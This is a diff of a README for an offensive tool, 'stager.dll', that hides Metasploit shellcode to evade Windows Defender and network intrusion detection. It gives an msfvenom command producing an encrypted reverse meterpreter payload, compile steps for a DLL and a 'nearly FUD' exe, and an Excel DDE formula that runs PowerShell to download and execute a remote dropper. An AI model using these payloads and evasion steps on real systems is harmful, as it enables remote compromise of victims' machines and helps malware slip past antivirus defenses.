@@ -1,12 +1,13 @@
 # stager.dll
 Code from this article: [https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/). The advantage is that you can embed well known open source payloads and still fly under the radar.  
 
-**HOW TO:**  
-If you want to use the reverse_tcp_rc4 meterpreter payload (useful to bypass NIDS),  get MSF5 from official repository (master branch - no official release yet at this time for v5): [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework).  
+## HOW TO:  
+If you want to use the reverse_tcp_rc4 meterpreter payload (useful to bypass NIDS),  get MSF5: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework).  
 
 Then generate payload that suits your needs, ex:  
 ```ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  
 
+### EMBED IN DLL:  
 Replace the payload in stager.cpp  and build the DLL on a Windows machine with ```cl /LD /MT /EHa stager.cpp aes.cpp``` [https://stackoverflow.com/questions/42794845/visual-studio-community-2017-cl-exe](https://stackoverflow.com/questions/42794845/visual-studio-community-2017-cl-exe)  
 
 ![https://phackt.com/public/images/stager/stager2.png](https://phackt.com/public/images/stager/stager2.png)  
@@ -55,9 +56,18 @@ For my purpose i finally used the following cell formula (taken from [https://bl
 ```
 =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell.exe -nop -w 1 $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.1.24/powershell_dropper_obf.ps1\"); IEX $e'!'A1'
 ```  
-  
+
+### EMBED IN EXE:  
 Also find the .cpp **stager_exe_{x86/x64}.cpp** in order to generate *nearly* FUD exe embedding msf payloads (at **6th of Jan. 2019** -> Score of **1/68 on VT**):  
 
 ![https://phackt.com/public/images/stager/stager4.png](https://phackt.com/public/images/stager/stager4.png)  
+
+**How to build:**
+```
+git clone https://github.com/phackt/stager.dll
+"C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Auxiliary\Build\vcvars64.bat"
+cl.exe /c aes.cpp stager_exe_64.cpp
+link.exe *.obj /OUT:stager.exe
+```
 
 Cheers,
